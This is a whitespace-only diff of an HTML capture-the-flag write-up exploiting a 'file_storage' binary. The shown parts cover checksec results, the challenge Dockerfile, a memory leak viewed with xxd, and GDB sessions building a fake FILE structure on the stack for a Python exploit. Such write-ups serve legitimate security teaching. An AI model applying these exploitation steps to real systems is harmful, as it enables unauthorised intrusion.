@@ -11,9 +11,9 @@ RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
 Stack:    <span class="code-dark-red">No canary found</span>
 NX:       <span class="code-dark-green">NX enabled</span>
 PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
-</code></pre></div><p>We see that it has NX enabled, so we cannot execute custom shellcode on the stack directly. Moreover, it has Partial RELRO, which means that the Global Offset Table (GOT) can be modified in some ways.</p><p>There is no PIE or Stack canaries, so fewer steps to perform the exploitation. Probably, we will only need to bypass ASLR.</p><h2 id="setup-environment">Setup environment</h2><p>We are given a <code>Dockerfile</code>, which will be presumably the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf0907</span><span class="mtk1">5062e937d5653d7d0db0375ad2221</span>
+</code></pre></div><p>We see that it has NX enabled, so we cannot execute custom shellcode on the stack directly. Moreover, it has Partial RELRO, which means that the Global Offset Table (GOT) can be modified in some ways.</p><p>There is no PIE or Stack canaries, so fewer steps to perform the exploitation. Probably, we will only need to bypass ASLR.</p><h2 id="setup-environment">Setup environment</h2><p>We are given a <code>Dockerfile</code>, which will be presumably the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu@sha256:a06ae92523384c2cd182dcfe7f8b2bf0907</span><span class="mtk1">5062e937d5653d7d0db0375ad2221</span>  
 <span class="mtk5">EXPOSE</span><span class="mtk1"> 1337</span>
-<span class="mtk5">RUN</span><span class="mtk1"> apt update &amp;&amp; apt install -y socat &amp;&amp; rm -rf /var</span><span class="mtk1">/lib/apt/lists/*</span>  
+<span class="mtk5">RUN</span><span class="mtk1"> apt update &amp;&amp; apt install -y socat &amp;&amp; rm -rf /var</span><span class="mtk1">/lib/apt/lists/*</span>
 <span class="mtk5">RUN</span><span class="mtk1"> useradd --user-group --system --no-log-init ctf</span>
 <span class="mtk5">USER</span><span class="mtk1"> ctf</span>
 <span class="mtk5">WORKDIR</span><span class="mtk1"> /home/ctf</span>
@@ -209,14 +209,14 @@ Cleaning files...
 </code></pre></div><p>We do not see anything because they are non-printable characters. Moreover, the files get deleted 5 seconds after showing the message <code>"Cleaning files..."</code>.</p><p>Let&rsquo;s use <code>xxd</code> to view the memory leak:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 4210720 &gt; /tmp/a.txt
 
 <span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span> | <span class="code-dark-green">xxd</span>
-00000000: 5765 6c63 6f6d 6520 746f 206d 7920 4669  Welcome to my Fi
+00000000: 5765 6c63 6f6d 6520 746f 206d 7920 4669  Welcome to my Fi  
 00000010: 6c65 2053 746f 7261 6765 2028 6265 7461  le Storage (beta
 00000020: 293a 0a0a 312e 2052 6561 6420 636f 6e74  ):..1. Read cont
 00000030: 656e 7473 2066 726f 6d20 6120 6669 6c65  ents from a file
 00000040: 0a32 2e20 5772 6974 6520 6461 7461 2069  .2. Write data i
 00000050: 6e74 6f20 6120 7261 6e64 6f6d 2066 696c  nto a random fil
 1
-00000060: 650a 332e 2045 7869 740a 3e20 4669 6c65  e.3. Exit.&gt; File  
+00000060: 650a 332e 2045 7869 740a 3e20 4669 6c65  e.3. Exit.&gt; File
 a.txt
 00000070: 6e61 6d65 3a20 5768 6174 2773 2069 6e20  name: What's in
 00000080: 7468 6520 6669 6c65 3f20 2873 7472 696e  the file? (strin
@@ -561,12 +561,12 @@ $1 = {
 <span class="code-dark-blue">0x7fffffffe6e0</span>: 0x00007ffff7fc04a0      0x4141414141414141
 </code></pre></div><p>At this point we see that the fake <code>FILE</code> structure is placed at <code>0x7fffffffe608</code> in the stack. Notice as well that the address of the environment variable changed when running GDB through the Python exploit. Now, we can replace <code>BBBBBBBB</code> for <code>p64(0x7fffffffe608)</code> and re-run the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep USER
 <span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
-<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
+<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
   0x7fffffffeeed - 0x7fffffffeef7  →   "<span class="code-dark-magenta">USER=rocky</span>"
 <span class="code-green">gef➤  </span>x/s 0x7fffffffeeed
 <span class="code-dark-blue">0x7fffffffeeed</span>: "USER=rocky"
 <span class="code-green">gef➤  </span>x/i $rip
-=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;  
+=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
 <span class="code-green">gef➤  </span>x/gx $rdi
 <span class="code-dark-blue">0x7fffffffe608</span>: 0x00000000fbad2484
 <span class="code-green">gef➤  </span>x/gx $rdx
